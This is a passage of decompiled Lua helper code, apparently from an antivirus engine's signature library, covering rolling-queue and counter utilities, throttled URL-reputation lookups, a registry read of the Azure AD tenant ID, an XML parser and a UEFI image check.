  local L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2, L17_2, L18_2, L19_2, L20_2, L21_2, L22_2, L23_2, L24_2, L25_2, L26_2, L27_2, L28_2, L29_2, L30_2
  L3_2 = type
  L4_2 = A0_2
  L3_2 = L3_2(L4_2)
  if L3_2 == "table" then
    L3_2 = type
    L4_2 = A1_2
    L3_2 = L3_2(L4_2)
    if L3_2 == "string" then
      goto lbl_13
    end
  end
  L3_2 = false
  do return L3_2 end
  ::lbl_13::
  L3_2 = type
  L4_2 = A2_2
  L3_2 = L3_2(L4_2)
  if L3_2 ~= "table" or not A2_2 then
    L3_2 = {}
    A2_2 = L3_2
  end
  L3_2 = A2_2.minCandidateLength
  if not L3_2 then
    L3_2 = 16
  end
  L4_2 = A2_2.minKeyLength
  if not L4_2 then
    L4_2 = 16
  end
  L5_2 = A2_2.maxKeyLength
  L6_2 = A2_2.keyInCandidateMinLength
  if not L6_2 then
    L6_2 = 24
  end
  L7_2 = A2_2.candidateInKeyMinLength
  if not L7_2 then
    L7_2 = 24
  end
  L8_2 = A2_2.distinctiveMinLength
  if not L8_2 then
    L8_2 = 24
  end
  L9_2 = A2_2.distinctiveBlobMinLength
  if not L9_2 then
    L9_2 = 32
  end
  L10_2 = A2_2.entryFilter
  L11_2 = L21_1
  L12_2 = A1_2
  L11_2 = L11_2(L12_2)
  L12_2 = #L11_2
  if L3_2 > L12_2 then
    L12_2 = false
    return L12_2
  end
  L12_2 = ipairs
  L13_2 = A0_2
  L12_2, L13_2, L14_2 = L12_2(L13_2)
  for L15_2, L16_2 in L12_2, L13_2, L14_2 do
    L17_2 = GetRollingQueue
    L18_2 = L16_2
    L17_2 = L17_2(L18_2)
    L18_2 = type
    L19_2 = L17_2
    L18_2 = L18_2(L19_2)
    if L18_2 == "table" then
      L18_2 = ipairs
      L19_2 = L17_2
      L18_2, L19_2, L20_2 = L18_2(L19_2)
      for L21_2, L22_2 in L18_2, L19_2, L20_2 do
        L23_2 = L22_2.key
        L24_2 = type
        L25_2 = L23_2
        L24_2 = L24_2(L25_2)
        if L24_2 == "string" then
          L24_2 = #L23_2
          if L4_2 <= L24_2 then
            if L5_2 ~= nil then
              L24_2 = #L23_2
              if not (L5_2 >= L24_2) then
                goto lbl_155
              end
            end
            if L10_2 ~= nil then
              L24_2 = L10_2
              L25_2 = L23_2
              L26_2 = L22_2.value
              L24_2 = L24_2(L25_2, L26_2)
              if not L24_2 then
                goto lbl_155
              end
            end
            L24_2 = L21_1
            L25_2 = L23_2
            L24_2 = L24_2(L25_2)
            L25_2 = #L24_2
            if L6_2 <= L25_2 then
              L25_2 = string
              L25_2 = L25_2.find
              L26_2 = L11_2
              L27_2 = L24_2
              L28_2 = 1
              L29_2 = true
              L25_2 = L25_2(L26_2, L27_2, L28_2, L29_2)
              if L25_2 then
                L25_2 = true
                L26_2 = L16_2
                L27_2 = L23_2
                L28_2 = L22_2.value
                L29_2 = "a_clip_in_buf"
                return L25_2, L26_2, L27_2, L28_2, L29_2
              end
            end
            L25_2 = #L11_2
            if L7_2 <= L25_2 then
              L25_2 = string
              L25_2 = L25_2.find
              L26_2 = L24_2
              L27_2 = L11_2
              L28_2 = 1
              L29_2 = true
              L25_2 = L25_2(L26_2, L27_2, L28_2, L29_2)
              if L25_2 then
                L25_2 = true
                L26_2 = L16_2
                L27_2 = L23_2
                L28_2 = L22_2.value
                L29_2 = "b_buf_in_clip"
                return L25_2, L26_2, L27_2, L28_2, L29_2
              end
            end
            L25_2 = L22_1
            L26_2 = L24_2
            L27_2 = L8_2
            L28_2 = L9_2
            L25_2 = L25_2(L26_2, L27_2, L28_2)
            if L25_2 ~= nil then
              L26_2 = string
              L26_2 = L26_2.find
              L27_2 = L11_2
              L28_2 = L25_2
              L29_2 = 1
              L30_2 = true
              L26_2 = L26_2(L27_2, L28_2, L29_2, L30_2)
              if L26_2 then
                L26_2 = true
                L27_2 = L16_2
                L28_2 = L23_2
                L29_2 = L22_2.value
                L30_2 = "c_needle"
                return L26_2, L27_2, L28_2, L29_2, L30_2
              end
            end
          end
        end
        ::lbl_155::
      end
    end
  end
  L12_2 = false
  return L12_2
end

FindRollingQueueContentMatch = L23_1

function L23_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2
  L2_2 = pcall
  L3_2 = MpCommon
  L3_2 = L3_2.RollingQueueQueryKey
  L4_2 = A0_2
  L5_2 = A1_2
  L2_2, L3_2 = L2_2(L3_2, L4_2, L5_2)
  if L2_2 and L3_2 then
    L4_2 = L3_2.value
    return L4_2
  end
  L4_2 = nil
  return L4_2
end

GetRollingQueueKeyValue = L23_1

function L23_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2
  L2_2 = pcall
  L3_2 = MpCommon
  L3_2 = L3_2.RollingQueueQueryMultiKey
  L4_2 = A0_2
  L5_2 = A1_2
  L2_2, L3_2 = L2_2(L3_2, L4_2, L5_2)
  if L2_2 then
    return L3_2
  end
  L4_2 = nil
  return L4_2
end

GetRollingQueueKeyValues = L23_1

function L23_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2
  L1_2 = GetRollingQueue
  L2_2 = A0_2
  L1_2 = L1_2(L2_2)
  if not L1_2 then
    return
  end
  L2_2 = {}
  L3_2 = ipairs
  L4_2 = L1_2
  L3_2, L4_2, L5_2 = L3_2(L4_2)
  for L6_2, L7_2 in L3_2, L4_2, L5_2 do
    L8_2 = table
    L8_2 = L8_2.insert
    L9_2 = L2_2
    L10_2 = L7_2.key
    L8_2(L9_2, L10_2)
  end
  return L2_2
end

GetRollingQueueKeys = L23_1

function L23_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2
  L2_2 = GetRollingQueue
  L3_2 = A0_2
  L2_2 = L2_2(L3_2)
  if not L2_2 then
    return
  end
  if not A1_2 then
    A1_2 = "|"
  end
  L3_2 = ""
  L4_2 = ipairs
  L5_2 = L2_2
  L4_2, L5_2, L6_2 = L4_2(L5_2)
  for L7_2, L8_2 in L4_2, L5_2, L6_2 do
    L9_2 = string
    L9_2 = L9_2.format
    L10_2 = "%s%s%s"
    L11_2 = L3_2
    L12_2 = A1_2
    L13_2 = L8_2.key
    L9_2 = L9_2(L10_2, L11_2, L12_2, L13_2)
    L3_2 = L9_2
  end
  L4_2 = L3_2
  L5_2 = A1_2
  L4_2 = L4_2 .. L5_2
  return L4_2
end

GetRollingQueueKeysAsString = L23_1

function L23_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2
  L2_2 = pcall
  L3_2 = MpCommon
  L3_2 = L3_2.RollingQueueCountValuesForKey
  L4_2 = A0_2
  L5_2 = A1_2
  L2_2, L3_2 = L2_2(L3_2, L4_2, L5_2)
  if not L2_2 then
    L3_2 = 0
  end
  return L3_2
end

GetRollingQueueCountForKey = L23_1

function L23_1(A0_2)
  local L1_2, L2_2, L3_2
  L1_2 = pcall
  L2_2 = MpCommon
  L2_2 = L2_2.RollingQueueSumOfValues
  L3_2 = A0_2
  L1_2, L2_2 = L1_2(L2_2, L3_2)
  if not L1_2 then
    L2_2 = nil
  end
  return L2_2
end

GetRollingQueueSumOfValues = L23_1

function L23_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2
  L1_2 = GetRollingQueue
  L2_2 = A0_2
  L1_2 = L1_2(L2_2)
  if not L1_2 then
    return
  end
  L2_2 = {}
  L3_2 = ipairs
  L4_2 = L1_2
  L3_2, L4_2, L5_2 = L3_2(L4_2)
  for L6_2, L7_2 in L3_2, L4_2, L5_2 do
    L8_2 = L7_2.key
    L9_2 = L7_2.value
    L2_2[L8_2] = L9_2
  end
  return L2_2
end

GetRollingQueueAsHashTable = L23_1

function L23_1(A0_2, A1_2, A2_2)
  local L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2
  L3_2 = GetRollingQueue
  L4_2 = A0_2
  L3_2 = L3_2(L4_2)
  if not L3_2 then
    return
  end
  L4_2 = ""
  if not A1_2 then
    A1_2 = "="
  end
  if not A2_2 then
    A2_2 = "|"
  end
  L5_2 = ipairs
  L6_2 = L3_2
  L5_2, L6_2, L7_2 = L5_2(L6_2)
  for L8_2, L9_2 in L5_2, L6_2, L7_2 do
    L10_2 = string
    L10_2 = L10_2.format
    L11_2 = "%s%s%s"
    L12_2 = L9_2.key
    L13_2 = A1_2
    L14_2 = L9_2.value
    L10_2 = L10_2(L11_2, L12_2, L13_2, L14_2)
    if L4_2 == "" then
      L4_2 = L10_2
    else
      L11_2 = string
      L11_2 = L11_2.format
      L12_2 = "%s%s%s"
      L13_2 = L4_2
      L14_2 = A2_2
      L15_2 = L10_2
      L11_2 = L11_2(L12_2, L13_2, L14_2, L15_2)
      L4_2 = L11_2
    end
  end
  return L4_2
end

GetRollingQueueHashTableAsString = L23_1

function L23_1(A0_2, A1_2, A2_2, A3_2, A4_2, A5_2)
  local L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2
  if not A2_2 then
    A2_2 = 1
  end
  if not A3_2 then
    A3_2 = 3600
  end
  if not A4_2 then
    A4_2 = 100
  end
  if not A5_2 then
    A5_2 = 1
  end
  L6_2 = pcall
  L7_2 = MpCommon
  L7_2 = L7_2.RollingQueueAppend
  L8_2 = A0_2
  L9_2 = A1_2
  L10_2 = A2_2
  L11_2 = A3_2
  L6_2 = L6_2(L7_2, L8_2, L9_2, L10_2, L11_2)
  if not L6_2 then
    L7_2 = pcall
    L8_2 = MpCommon
    L8_2 = L8_2.RollingQueueCreate
    L9_2 = A0_2
    L10_2 = A4_2
    L11_2 = A3_2
    L12_2 = A5_2
    L7_2(L8_2, L9_2, L10_2, L11_2, L12_2)
    L7_2 = pcall
    L8_2 = MpCommon
    L8_2 = L8_2.RollingQueueAppend
    L9_2 = A0_2
    L10_2 = A1_2
    L11_2 = A2_2
    L12_2 = A3_2
    L7_2 = L7_2(L8_2, L9_2, L10_2, L11_2, L12_2)
    L6_2 = L7_2
  end
  return L6_2
end

AppendToRollingQueue = L23_1

function L23_1(A0_2, A1_2, A2_2, A3_2, A4_2, A5_2, A6_2)
  local L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2
  if not A3_2 then
    A3_2 = 1
  end
  if not A4_2 then
    A4_2 = 3600
  end
  if not A5_2 then
    A5_2 = 100
  end
  if not A6_2 then
    A6_2 = 1
  end
  L7_2 = pcall
  L8_2 = MpCommon
  L8_2 = L8_2.RollingQueueAppendNamespaced
  L9_2 = A0_2
  L10_2 = A1_2
  L11_2 = A2_2
  L12_2 = A3_2
  L13_2 = A4_2
  L7_2 = L7_2(L8_2, L9_2, L10_2, L11_2, L12_2, L13_2)
  if not L7_2 then
    L8_2 = pcall
    L9_2 = MpCommon
    L9_2 = L9_2.RollingQueueCreateNamespaced
    L10_2 = A0_2
    L11_2 = A1_2
    L12_2 = A5_2
    L13_2 = A4_2
    L14_2 = A6_2
    L8_2(L9_2, L10_2, L11_2, L12_2, L13_2, L14_2)
    L8_2 = pcall
    L9_2 = MpCommon
    L9_2 = L9_2.RollingQueueAppendNamespaced
    L10_2 = A0_2
    L11_2 = A1_2
    L12_2 = A2_2
    L13_2 = A3_2
    L14_2 = A4_2
    L8_2 = L8_2(L9_2, L10_2, L11_2, L12_2, L13_2, L14_2)
    L7_2 = L8_2
  end
  return L7_2
end

AppendToRollingQueueNamespaced = L23_1

function L23_1(A0_2)
  local L1_2, L2_2, L3_2
  L1_2 = pcall
  L2_2 = MpCommon
  L2_2 = L2_2.RollingQueueCount
  L3_2 = A0_2
  L1_2, L2_2 = L1_2(L2_2, L3_2)
  if not L1_2 then
    L2_2 = 0
  end
  return L2_2
end

GetRollingQueueCount = L23_1

function L23_1(A0_2, A1_2, A2_2)
  local L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2
  L3_2 = false
  L4_2 = nil
  L5_2 = false
  L6_2 = nil
  L7_2 = nil
  if A2_2 == nil then
    A2_2 = true or A2_2
  end
  if A2_2 then
    L8_2 = pcall
    L9_2 = MpCommon
    L9_2 = L9_2.RollingQueueQueryKey
    L10_2 = A0_2
    L11_2 = A1_2
    L8_2, L9_2 = L8_2(L9_2, L10_2, L11_2)
    L7_2 = L9_2
    L5_2 = L8_2
    if L5_2 then
      L8_2 = {}
      L9_2 = L7_2
      L8_2[1] = L9_2
      L6_2 = L8_2
    else
      L8_2 = pcall
      L9_2 = MpCommon
      L9_2 = L9_2.RollingQueueQueryMultiKey
      L10_2 = A0_2
      L11_2 = A1_2
      L8_2, L9_2 = L8_2(L9_2, L10_2, L11_2)
      L6_2 = L9_2
      L5_2 = L8_2
      if not L5_2 then
        L6_2 = nil
      end
    end
  else
    L8_2 = pcall
    L9_2 = MpCommon
    L9_2 = L9_2.RollingQueueQueryMultiKeyRegex
    L10_2 = A0_2
    L11_2 = A1_2
    L8_2, L9_2 = L8_2(L9_2, L10_2, L11_2)
    L6_2 = L9_2
    L5_2 = L8_2
    if not L5_2 then
      L6_2 = nil
    end
  end
  if L6_2 then
    L8_2 = next
    L9_2 = L6_2
    L8_2, L9_2 = L8_2(L9_2)
    if L9_2 then
      L3_2 = true
      L4_2 = L9_2.value
    end
  end
  L8_2 = L3_2
  L9_2 = L4_2
  L10_2 = L6_2
  return L8_2, L9_2, L10_2
end

IsKeyInRollingQueue = L23_1

function L23_1(A0_2, A1_2, A2_2, A3_2, A4_2)
  local L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2
  L5_2 = ipairs
  L6_2 = A2_2
  L5_2, L6_2, L7_2 = L5_2(L6_2)
  for L8_2, L9_2 in L5_2, L6_2, L7_2 do
    L10_2 = AppendToRollingQueue
    L11_2 = A0_2
    L12_2 = A1_2
    L13_2 = L9_2
    L14_2 = A3_2
    L15_2 = A4_2
    L16_2 = 0
    L10_2(L11_2, L12_2, L13_2, L14_2, L15_2, L16_2)
  end
end

AppendToMultiValueRollingQueue = L23_1

function L23_1(A0_2, A1_2, A2_2, A3_2)
  local L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2
  if not A3_2 then
    A3_2 = true
  end
  L4_2 = GetRollingQueueKeyValues
  L5_2 = A0_2
  L6_2 = A1_2
  L4_2 = L4_2(L5_2, L6_2)
  if L4_2 then
    L5_2 = ipairs
    L6_2 = L4_2
    L5_2, L6_2, L7_2 = L5_2(L6_2)
    for L8_2, L9_2 in L5_2, L6_2, L7_2 do
      if A3_2 then
        L10_2 = L9_2.value
        if L10_2 == A2_2 then
          L10_2 = true
          return L10_2
      end
      else
        L10_2 = string
        L10_2 = L10_2.find
        L11_2 = L9_2.value
        L12_2 = A2_2
        L13_2 = 1
        L14_2 = true
        L10_2 = L10_2(L11_2, L12_2, L13_2, L14_2)
        if L10_2 then
          L10_2 = true
          L11_2 = L9_2.value
          return L10_2, L11_2
        end
      end
    end
  end
  L5_2 = false
  return L5_2
end

IsKeyValuePairInRollingQueue = L23_1

function L23_1(A0_2)
  local L1_2, L2_2, L3_2
  L1_2 = pcall
  L2_2 = MpCommon
  L2_2 = L2_2.RollingQueueErase
  L3_2 = A0_2
  L1_2, L2_2 = L1_2(L2_2, L3_2)
  if L1_2 then
    L3_2 = true
    return L3_2
  end
  L3_2 = false
  return L3_2
end

EraseRollingQueue = L23_1

function L23_1(A0_2)
  local L1_2, L2_2, L3_2
  if A0_2 ~= nil then
    L1_2 = pcall
    L2_2 = MpCommon
    L2_2 = L2_2.AtomicCounterValue
    L3_2 = A0_2
    L1_2, L2_2 = L1_2(L2_2, L3_2)
    if L1_2 then
      return L2_2
    end
  end
  L1_2 = nil
  return L1_2
end

GetAtomicCounter = L23_1

function L23_1(A0_2, A1_2, A2_2)
  local L3_2, L4_2, L5_2, L6_2, L7_2, L8_2
  if A0_2 ~= nil then
    if not A2_2 then
      A2_2 = 3600
    end
    L3_2 = pcall
    L4_2 = MpCommon
    L4_2 = L4_2.AtomicCounterSet
    L5_2 = A0_2
    L6_2 = A1_2
    L7_2 = A2_2
    L3_2, L4_2 = L3_2(L4_2, L5_2, L6_2, L7_2)
    if L3_2 then
      if not L4_2 then
        L5_2 = 0
        return L5_2
      end
    else
      L5_2 = pcall
      L6_2 = MpCommon
      L6_2 = L6_2.AtomicCounterAdd
      L7_2 = A0_2
      L8_2 = A1_2
      L5_2, L6_2 = L5_2(L6_2, L7_2, L8_2)
      if L5_2 then
        return L6_2
      end
    end
  end
  L3_2 = nil
  return L3_2
end

AddToAtomicCounter = L23_1

function L23_1(A0_2, A1_2, A2_2, A3_2, A4_2, A5_2)
  local L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2, L17_2, L18_2, L19_2, L20_2, L21_2, L22_2, L23_2
  if not A2_2 then
    A2_2 = false
  end
  if not A3_2 then
    A3_2 = 0
  end
  if A4_2 == nil then
    A4_2 = true or A4_2
  end
  if A5_2 == nil then
    A5_2 = true or A5_2
  end
  L6_2 = {}
  L7_2 = {}
  L6_2.urls = L7_2
  if A5_2 then
    L7_2 = pcall
    L8_2 = MpCommon
    L8_2 = L8_2.AtomicCounterValue
    L9_2 = "GetUrlReputationThrottled"
    L7_2, L8_2 = L7_2(L8_2, L9_2)
    if L7_2 and L8_2 then
      L6_2.error = 1
      return L6_2
    end
  end
  if A4_2 then
    L7_2 = pcall
    L8_2 = MpCommon
    L8_2 = L8_2.AtomicCounterValue
    L9_2 = "LCGUR"
    L7_2, L8_2 = L7_2(L8_2, L9_2)
    if L7_2 then
      L9_2 = versioning
      L9_2 = L9_2.GetEngineBuild
      L9_2 = L9_2()
      if L8_2 == L9_2 then
        L6_2.error = 2
        return L6_2
      end
    end
  end
  L7_2 = table_dedup
  L8_2 = A0_2
  L7_2 = L7_2(L8_2)
  A0_2 = L7_2
  L7_2 = MpCommon
  L7_2 = L7_2.GetCurrentTimeT
  L7_2 = L7_2()
  L8_2 = pcall
  L9_2 = mp
  L9_2 = L9_2.GetUrlReputation
  L10_2 = A0_2
  L11_2 = A1_2
  L12_2 = A2_2
  L13_2 = A3_2
  L8_2, L9_2 = L8_2(L9_2, L10_2, L11_2, L12_2, L13_2)
  if not L8_2 then
    L6_2.error = 3
    L6_2.err_msg = L9_2
    L10_2 = MpCommon
    L10_2 = L10_2.GetCurrentTimeT
    L10_2 = L10_2()
    L11_2 = L10_2 - L7_2
    L12_2 = pcall
    L13_2 = MpCommon
    L13_2 = L13_2.AtomicCounterSet
    L14_2 = "LCGUR"
    L15_2 = tostring
    L16_2 = versioning
    L16_2 = L16_2.GetEngineBuild
    L16_2, L17_2, L18_2, L19_2, L20_2, L21_2, L22_2, L23_2 = L16_2()
    L15_2 = L15_2(L16_2, L17_2, L18_2, L19_2, L20_2, L21_2, L22_2, L23_2)
    L16_2 = 7200
    L12_2(L13_2, L14_2, L15_2, L16_2)
    L12_2 = {}
    L13_2 = 0
    L12_2.urlTbl = A0_2
    L12_2.ctxTbl = A1_2
    L12_2.response = L6_2
    L12_2.timeout = A3_2
    L12_2.response_time = L11_2
    L14_2 = tostring
    L15_2 = versioning
    L15_2 = L15_2.GetEngineBuild
    L15_2, L16_2, L17_2, L18_2, L19_2, L20_2, L21_2, L22_2, L23_2 = L15_2()
    L14_2 = L14_2(L15_2, L16_2, L17_2, L18_2, L19_2, L20_2, L21_2, L22_2, L23_2)
    L12_2.EngineBuild = L14_2
    if L11_2 < 5 then
      L13_2 = 1
    elseif 5 < L11_2 and A3_2 > L11_2 then
      L13_2 = 2
    elseif A3_2 < L11_2 then
      L13_2 = 3
    end
    L12_2.errorCategory = L13_2
    L14_2 = safeJsonSerialize
    L15_2 = L12_2
    L16_2 = 250
    L17_2 = nil
    L18_2 = true
    L14_2, L15_2 = L14_2(L15_2, L16_2, L17_2, L18_2)
    if L14_2 then
      L16_2 = 26000
      L17_2 = #L14_2
      if L16_2 < L17_2 then
        L17_2 = string
        L17_2 = L17_2.sub
        L18_2 = L14_2
        L19_2 = 1
        L20_2 = L16_2
        L17_2 = L17_2(L18_2, L19_2, L20_2)
        L14_2 = L17_2
      end
    end
    L16_2 = bm
    if L16_2 then
      L16_2 = bm
      L16_2 = L16_2.trigger_sig
      L17_2 = "GetUrlReputationError"
      L18_2 = L14_2 or L18_2
      if not L14_2 then
        L18_2 = L15_2
      end
      L16_2(L17_2, L18_2)
    else
      L16_2 = pcall
      L17_2 = mp
      L17_2 = L17_2.get_contextdata
      L18_2 = mp
      L18_2 = L18_2.CONTEXT_DATA_PROCESS_PPID
      L16_2, L17_2 = L16_2(L17_2, L18_2)
      if L16_2 and L17_2 then
        L18_2 = MpCommon
        L18_2 = L18_2.BmTriggerSig
        L19_2 = L17_2
        L20_2 = "GetUrlReputationError"
        L21_2 = L14_2 or L21_2
        if not L14_2 then
          L21_2 = L15_2
        end
        L18_2(L19_2, L20_2, L21_2)
      end
    end
    return L6_2
  end
  if not A2_2 and L9_2 then
    L10_2 = 0
    L11_2 = ipairs
    L12_2 = L9_2.urls
    L11_2, L12_2, L13_2 = L11_2(L12_2)
    for L14_2, L15_2 in L11_2, L12_2, L13_2 do
      L16_2 = L6_2.urls
      L17_2 = L15_2.url
      L18_2 = {}
      L19_2 = L15_2.determination
      L18_2.determination = L19_2
      L19_2 = L15_2.confidence
      L18_2.confidence = L19_2
      L16_2[L17_2] = L18_2
      L16_2 = L15_2.urlresponsecontext
      if L16_2 then
        L16_2 = L6_2.urls
        L17_2 = L15_2.url
        L16_2 = L16_2[L17_2]
        L17_2 = {}
        L16_2.context = L17_2
        L16_2 = ipairs
        L17_2 = L15_2.urlresponsecontext
        L16_2, L17_2, L18_2 = L16_2(L17_2)
        for L19_2, L20_2 in L16_2, L17_2, L18_2 do
          L21_2 = L6_2.urls
          L22_2 = L15_2.url
          L21_2 = L21_2[L22_2]
          L21_2 = L21_2.context
          L22_2 = L20_2.key
          L23_2 = L20_2.value
          L21_2[L22_2] = L23_2
        end
        L16_2 = L6_2.urls
        L17_2 = L15_2.url
        L16_2 = L16_2[L17_2]
        L16_2 = L16_2.context
        L16_2 = L16_2.throttle
        if L16_2 then
          L16_2 = math_max
          L17_2 = L10_2
          L18_2 = tonumber
          L19_2 = L6_2.urls
          L20_2 = L15_2.url
          L19_2 = L19_2[L20_2]
          L19_2 = L19_2.context
          L19_2 = L19_2.throttle
          L18_2, L19_2, L20_2, L21_2, L22_2, L23_2 = L18_2(L19_2)
          L16_2 = L16_2(L17_2, L18_2, L19_2, L20_2, L21_2, L22_2, L23_2)
          L10_2 = L16_2
        end
      end
    end
    if L10_2 ~= 0 then
      L11_2 = pcall
      L12_2 = MpCommon
      L12_2 = L12_2.AtomicCounterSet
      L13_2 = "GetUrlReputationThrottled"
      L14_2 = 1
      L15_2 = L10_2
      L11_2(L12_2, L13_2, L14_2, L15_2)
    end
    L9_2.urls = nil
    L11_2 = pairs
    L12_2 = L9_2
    L11_2, L12_2, L13_2 = L11_2(L12_2)
    for L14_2, L15_2 in L11_2, L12_2, L13_2 do
      L6_2[L14_2] = L15_2
    end
  end
  return L6_2
end

SafeGetUrlReputation = L23_1

function L23_1()
  local L0_2, L1_2, L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2
  L0_2 = "AadTenantInfo"
  L1_2 = "AadTenantID"
  L2_2 = GetRollingQueueKeyValue
  L3_2 = L0_2
  L4_2 = L1_2
  L2_2 = L2_2(L3_2, L4_2)
  if L2_2 == nil then
    L2_2 = "0"
    L3_2 = sysio
    L3_2 = L3_2.RegOpenKey
    L4_2 = "HKLM\\SYSTEM\\CurrentControlSet\\Control\\CloudDomainJoin\\TenantInfo\\"
    L3_2 = L3_2(L4_2)
    if L3_2 then
      L4_2 = sysio
      L4_2 = L4_2.RegEnumKeys
      L5_2 = L3_2
      L4_2 = L4_2(L5_2)
      if L4_2 then
        L5_2 = ipairs
        L6_2 = L4_2
        L5_2, L6_2, L7_2 = L5_2(L6_2)
        for L8_2, L9_2 in L5_2, L6_2, L7_2 do
          if L9_2 then
            L10_2 = type
            L11_2 = L9_2
            L10_2 = L10_2(L11_2)
            if L10_2 == "string" then
              L11_2 = L9_2
              L10_2 = L9_2.match
              L12_2 = "^%x%x%x%x%x%x%x%x%-%x%x%x%x%-%x%x%x%x%-%x%x%x%x%-%x%x%x%x%x%x%x%x%x%x%x%x$"
              L10_2 = L10_2(L11_2, L12_2)
              if L10_2 then
                L2_2 = L9_2
                break
              end
            end
          end
        end
      end
    end
    L4_2 = AppendToRollingQueue
    L5_2 = L0_2
    L6_2 = L1_2
    L7_2 = L2_2
    L8_2 = 86400
    L9_2 = 10
    L4_2(L5_2, L6_2, L7_2, L8_2, L9_2)
  end
  if L2_2 == "0" then
    return
  end
  return L2_2
end

getAadTenantID = L23_1

function L23_1(A0_2, A1_2, A2_2)
  local L3_2, L4_2, L5_2, L6_2
  L4_2 = A0_2
  L3_2 = A0_2.gsub
  L5_2 = "<!%-%-(.-)%-%->"
  L6_2 = ""
  L3_2 = L3_2(L4_2, L5_2, L6_2)
  A0_2 = L3_2
  L4_2 = A0_2
  L3_2 = A0_2.gsub
  L5_2 = "<%?(.-)%?>"
  L6_2 = ""
  L3_2 = L3_2(L4_2, L5_2, L6_2)
  A0_2 = L3_2
  L4_2 = A0_2
  L3_2 = A0_2.gsub
  L5_2 = "<([/!]?)([%a_][%w-:_]*)%s*(/?>?)([^<]*)"
  
  function L6_2(A0_3, A1_3, A2_3, A3_3)
    local L4_3, L5_3, L6_3, L7_3, L8_3, L9_3, L10_3, L11_3, L12_3, L13_3, L14_3, L15_3, L16_3
    L4_3 = #A0_3
    if L4_3 == 0 then
      L4_3 = {}
      L5_3 = #A2_3
      if L5_3 == 0 then
        L5_3 = 0
        L6_3 = string
        L6_3 = L6_3.gmatch
        L7_3 = A3_3
        L8_3 = "(([%a_][%w-:_]*)%s*=%s*(['\"])(.-)%3%s*(/?>?))"
        L6_3, L7_3, L8_3 = L6_3(L7_3, L8_3)
        for L9_3, L10_3, L11_3, L12_3, L13_3 in L6_3, L7_3, L8_3 do
          L14_3 = #L9_3
          L5_3 = L5_3 + L14_3
          L4_3[L10_3] = L12_3
          L14_3 = #L13_3
          if L14_3 ~= 0 then
            if L13_3 == "/>" then
              A3_3 = ""
            elseif L13_3 == ">" then
              L15_3 = A3_3
              L14_3 = A3_3.sub
              L16_3 = L5_3 + 1
              L14_3 = L14_3(L15_3, L16_3)
              A3_3 = L14_3
            else
              L14_3 = error
              L15_3 = "invalid tag"
              L14_3(L15_3)
            end
            A2_3 = L13_3
          end
        end
      end
      L5_3 = next
      L6_3 = L4_3
      L5_3 = L5_3(L6_3)
      if not L5_3 then
        L4_3 = nil
      end
      L5_3 = A1_2
      L6_3 = A1_3
      L7_3 = L4_3
      L9_3 = A3_3
      L8_3 = A3_3.match
      L10_3 = "^%s*(.*%S)"
      L8_3, L9_3, L10_3, L11_3, L12_3, L13_3, L14_3, L15_3, L16_3 = L8_3(L9_3, L10_3)
      L5_3(L6_3, L7_3, L8_3, L9_3, L10_3, L11_3, L12_3, L13_3, L14_3, L15_3, L16_3)
      L6_3 = A2_3
      L5_3 = A2_3.byte
      L7_3 = 1
      L5_3 = L5_3(L6_3, L7_3)
      L6_3 = string
      L6_3 = L6_3.byte
      L7_3 = "/"
      L6_3 = L6_3(L7_3)
      if L5_3 == L6_3 then
        L5_3 = A2_2
        L6_3 = A1_3
        L5_3(L6_3)
      end
    elseif A0_3 == "/" then
      L4_3 = A2_2
      L5_3 = A1_3
      L4_3(L5_3)
    elseif A0_3 == "!" then
      L4_3 = error
      L5_3 = "unsupported tag type"
      L4_3(L5_3)
    else
      L4_3 = error
      L5_3 = "parsing error"
      L4_3(L5_3)
    end
  end
  
  L3_2(L4_2, L5_2, L6_2)
end

parseXML = L23_1

function L23_1(A0_2, A1_2, A2_2, A3_2)
  local L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2
  if not A2_2 then
    A2_2 = 100
  end
  if not A3_2 then
    A3_2 = 604800
  end
  L4_2 = string
  L4_2 = L4_2.sub
  L5_2 = A0_2
  L6_2 = 1
  L7_2 = 12
  L4_2 = L4_2(L5_2, L6_2, L7_2)
  if L4_2 == "\\UefiImage->" then
    L4_2 = pcall
    L5_2 = MpCommon
    L5_2 = L5_2.RollingQueueQueryKey
    L6_2 = A1_2
    L7_2 = A0_2
    L4_2, L5_2 = L4_2(L5_2, L6_2, L7_2)
    if L4_2 then
      L6_2 = false
      return L6_2
    end
    L6_2 = AppendToRollingQueue
    L7_2 = A1_2
    L8_2 = A0_2
    L9_2 = "1"
    L10_2 = A3_2
    L11_2 = A2_2
    L12_2 = 1
    L6_2 = L6_2(L7_2, L8_2, L9_2, L10_2, L11_2, L12_2)
    if not L6_2 then
      L6_2 = false
      return L6_2
    end
    L6_2 = true
    return L6_2
  end
  L4_2 = false
  return L4_2
end

CheckVulnerableUEFIImage = L23_1

function L23_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2, L6_2
  L2_2 = GetRollingQueueKeyValue
  L3_2 = "CC_filelist"
  L4_2 = A0_2
  L2_2 = L2_2(L3_2, L4_2)
  if not L2_2 then
    L3_2 = false
    return L3_2
  end
  L3_2 = type
  L4_2 = A1_2
  L3_2 = L3_2(L4_2)
  if L3_2 ~= "table" then
